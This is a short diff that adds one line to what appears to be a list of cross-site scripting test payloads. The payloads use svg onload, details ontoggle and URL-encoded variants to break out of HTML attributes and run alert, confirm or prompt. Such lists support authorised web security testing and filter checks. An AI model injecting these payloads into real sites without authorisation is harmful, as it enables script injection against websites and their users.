@@ -12,6 +12,7 @@ p="><!--
 q=--><svg onload=alert(1)>
 p="1='
 q='><svg onload=alert(1)>
+<svg onload="alert(1)" <="" svg=""
 ';a=alert;a(1);//
 ">'><details/open/ontoggle=confirm('XSS')> ⌝
 6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/ ⌝
